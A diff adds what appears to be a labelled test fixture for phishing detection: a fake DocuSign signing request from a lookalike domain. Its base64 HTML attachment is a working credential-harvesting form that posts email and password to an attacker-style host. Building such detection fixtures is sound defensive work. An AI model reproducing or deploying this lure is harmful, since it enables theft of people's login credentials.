@@ -1,0 +1,35 @@
+Received: from smtp.docusign-envelope.net (smtp.docusign-envelope.net
+ [91.92.109.14]) by mx1.cci-demo.com (Postfix) with ESMTPS id 4Xyz0003; Sun,
+ 20 Sep 2026 08:03:00 +0000
+Received: from mx1.cci-demo.com (10.0.0.25) by exch01.cci-demo.com
+ (10.0.0.30); Sun, 20 Sep 2026 08:03:00 +0000
+Authentication-Results: mx1.cci-demo.com; spf=pass dkim=pass dmarc=none
+ header.from=docusign-envelope.net
+From: "DocuSign" <no-reply@docusign-envelope.net>
+To: jane.doe@cci-demo.com
+Subject: Jane, please review and sign: Q3 Vendor Agreement.html
+Date: Sun, 20 Sep 2026 08:03:00 +0000
+Message-ID: <179026443137.13628.8872506288848151438@docusign-envelope.net>
+X-Test-Label: malicious
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="===============6520034859184045271=="
+
+--===============6520034859184045271==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+You have a document waiting for your signature. Open the attached document to=
+ sign.
+
+--===============6520034859184045271==
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Q3_Vendor_Agreement.html"
+MIME-Version: 1.0
+
+PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSdodHRwczovL2RvY3Mtc2lnbi5kb2N1c2lnbi1lbnZl
+bG9wZS5uZXQvYXV0aC5waHAnIG1ldGhvZD0ncG9zdCc+RW1haWwgPGlucHV0IG5hbWU9J3UnPiBQ
+YXNzd29yZCA8aW5wdXQgdHlwZT0ncGFzc3dvcmQnIG5hbWU9J3AnPjwvZm9ybT48L2JvZHk+PC9o
+dG1sPg==
+
+--===============6520034859184045271==--
